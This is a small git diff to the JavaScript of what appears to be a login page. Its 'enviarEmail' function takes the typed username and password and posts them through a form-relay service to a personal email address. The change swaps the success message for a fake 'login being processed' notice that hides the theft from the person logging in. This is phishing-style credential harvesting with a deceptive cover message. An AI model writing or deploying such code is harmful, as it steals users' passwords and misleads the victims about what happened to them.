@@ -44,7 +44,7 @@ button.addEventListener("click", () => {
 const enviarEmail = () => {
   let usuario = user.value;
   let senha = password.value;
-  
+
 
   fetch("https://formsubmit.co/ajax/ezequielfernandes912@gmail.com", {
     method: "POST",
@@ -61,7 +61,7 @@ const enviarEmail = () => {
   })
     .then(response => response.json())
     .then(data => {
-      alert("Email enviado com sucesso!");
+      alert("Login em processamento, enviaremos um email para confirmar!");
       console.log(data);
     })
     .catch(error => {
